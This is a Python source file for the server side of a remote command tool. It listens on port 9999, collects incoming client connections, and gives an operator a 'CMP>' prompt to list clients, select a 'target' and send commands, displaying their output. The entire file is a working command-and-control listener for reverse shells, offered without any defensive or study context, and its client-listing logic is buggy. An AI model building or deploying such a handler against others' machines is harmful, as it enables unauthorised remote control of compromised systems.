import socket
import threading
from queue import Queue


NUMBER_OF_THREADS = 2
JOB_NUMBER = [0, 1]
queue = Queue()
event = threading.Event()
connections = []
addresses = []


def main():
    create_workers()
    create_jobs()


# Creating a socket for connecting two computers.
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as sem:
        print("Socket could not be created. Error Message: {}".format(sem))


# Binding the socket and listening for incoming connections.
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the port {}".format(str(port)))

        s.bind((host, port))
        s.listen(5)

    except socket.error as sem:
        print("Socket could not be binded. Error Message: {}".format(sem))
        bind_socket()


# Handling and saving multiple connections.
# Closing previous connections when server.py file is restarted.
def accept_connection():

    for c in connections:
        c.close()

    del connections[:]
    del addresses[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)  # Prevents timeout

            connections.append(conn)
            addresses.append(address)

            print(f"\nConnection has been established> {address[0]}\n> ", end="")

        except:
            print("Error connection could not established.")


# 2nd thread functions - 1) See all the clients 2) Select a client 3) Send commands to the connected client.
# Interactive prompt for sending commands.
def start_cmp():
    while True:
        cmd = input("CMP> ")

        if cmd == "help":
            cmp_help()

        elif "list" in cmd:
            list_connections()

        elif "select" in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_commands(conn)

        else:
            print("Unknown command, to see all commands enter help command.")


# Display a help message for cmp.
def cmp_help():
    print(
        "---COMMANDS---\nhelp: print help message\nlist: list all available connections.\nselect: select and connect to a connection.(Example: select 0)"
    )


# Display all current active connnections with the client.
def list_connections():
    results = ""

    if not connections:
        print("There is no client connected to you\n")

    else:

        for i, conn in enumerate(connections):
            try:
                conn.send(str.encode(" "))
                conn.recv(201480)
            except:
                del connections[i]
                del addresses[i]
                continue

            results = "{}   {}  {}  \n".format(
                str(i), str(addresses[i][0]), str(addresses[i][1])
            )

        print("---Clients---\n{}".format(results))


def get_target(cmd):
    try:
        target = int(cmd.lstrip("select"))
        print(target)
        conn = connections[target]
        print(f"Selected target {target}|{addresses[target][0]}")
        return conn

    except:
        print("Selection not valid.")
        return None


# Send commands to client.
def send_commands(conn):
    init = True
    while True:
        try:
            if init:
                initial_response = str(conn.recv(1024), "utf-8")
                print(initial_response, end="")
                init = False

            cmd = input()

            if cmd == "quit":
                break

            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")

        except:
            print("Error command could not be sent.")


# Create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True  # Important to check if thread stopped with the program.
        t.start()


# Allocate threads for jobs that is in the queue.
def work():
    while True:
        x = queue.get()

        if x == 0:
            create_socket()
            bind_socket()
            event.set()
            accept_connection()

        event.wait(timeout=5)  # Wait for second thread to complete binding.

        if x == 1 and event.is_set():
            start_cmp()

        queue.task_done()


def create_jobs():
    for i in JOB_NUMBER:
        queue.put(i)

    queue.join()


if __name__ == "__main__":
    main()
